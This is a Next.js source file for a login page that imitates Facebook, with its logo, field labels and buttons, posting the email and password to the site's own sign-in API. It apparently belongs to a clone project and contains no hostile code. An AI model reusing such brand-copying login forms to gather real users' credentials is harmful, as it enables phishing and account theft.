"use client";
import Link from "next/link";
import Image from "next/image";
import { useRouter, redirect } from "next/navigation";
import { Visibility, VisibilityOff } from "@mui/icons-material";
import { useState } from "react";

export default function Home() {
  const router = useRouter();

  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");

  const [passwordShow, setPasswordShow] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [error, setError] = useState({ error: false, message: "", e: "" });

  async function handleSubmit(e) {
    e.preventDefault();
    setIsSubmitting(true);

    // Check for empty fields before making the API call
    if (email === "") {
      setError({ error: true, message: "Please enter your email address", e: "email" });
      setIsSubmitting(false);
      return;
    }

    if (password === "") {
      setError({ error: true, message: "Please enter your password", e: "password" });
      setIsSubmitting(false);
      return;
    }
    setError({ error: false, message: "", e: "" });

    // Fetch signin POST route
    const response = await fetch("/api/auth/signin", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({ email, password }),
    });

    const result = await response.json();

    if (result.success) {
      redirect("/facebook");
    } else {
      setError({ error: true, message: result.error || "Login failed", e: "general" });
      setIsSubmitting(false);
    }
  }

  return (
    <>
      <main>
        <div className="flex justify-center mt-10 font-black">
          <Image src="/favicon.ico" alt="Facebook logo" width={50} height={50} id="logo" />
        </div>

        <div className="mx-auto px-5 py-10">
          <form onSubmit={handleSubmit} aria-busy={isSubmitting} className="space-y-5 mt-10">
            <div className="relative">
              <label htmlFor="email" className="absolute top-0 left-4">
                Mobile number or email address
              </label>
              <input
                type="email"
                placeholder=""
                name="email"
                disabled={isSubmitting}
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                id="email"
                autoComplete="on"
                className={`input-class ${isSubmitting ? "cursor-not-allowed opacity-50" : ""} border border-[var(--border)] text-[var(--foreground)] bg-transparent w-full h-full pt-6 pb-4 px-4 rounded-[15px] focus:outline-stone-500]`}
              />
              {error.error && error.e === "email" && <p className="text-red-500">{error.message}</p>}
            </div>

            <div className="relative">
              <label htmlFor="password" className="absolute top-0 left-4">
                Password
              </label>
              <input
                type={passwordShow ? "text" : "password"}
                name="password"
                disabled={isSubmitting}
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                id="password"
                autoComplete="off"
                className={`input-class ${isSubmitting ? "cursor-not-allowed opacity-50" : ""} border border-[var(--border)] text-[var(--foreground)] bg-transparent w-full h-full pt-6 pb-4 px-4 rounded-[15px] focus:outline-stone-500`}
              />

              <button type="button" className="absolute top-4 right-2" onClick={() => setPasswordShow(!passwordShow)}>
                {passwordShow ? <Visibility /> : <VisibilityOff />}
              </button>

              {error.error && error.e === "password" && <p className="text-red-500">{error.message}</p>}
            </div>

            {error.error && error.e === "general" && <p className="text-red-500 text-start">{error.message}</p>}

            <div>
              <button
                onClick={handleSubmit}
                disabled={isSubmitting}
                className={`${isSubmitting ? "cursor-not-allowed opacity-50" : ""} cursor-pointer my-2 bg-[var(--secondary)] hover:bg-[var(--secondary-dim)] transition-all duration-300 text-white p-[13px] w-[100%] rounded-[50px]`}
                type="submit"
                name="login"
              >
                {isSubmitting ? <p>Logging in...</p> : "Log in"}
              </button>
            </div>

            <div className="text-center">
              <Link href="#" id="forgotPassword" className="my-2 text-lg text-[var(--foreground)]">
                Forgotten password?
              </Link>
            </div>

            <div className="text-center mt-25">
              <button
                id="createAccount"
                type="button"
                onClick={() => router.push("/register")}
                className="cursor-pointer text-[var(--secondary)] hover:bg-[var(--secondary-light)] transition-all duration-300 p-[13px] w-[100%] border border-[var(--secondary)] outline-none rounded-[50px]"
              >
                Create new account
              </button>
            </div>
          </form>
        </div>
      </main>
    </>
  );
}
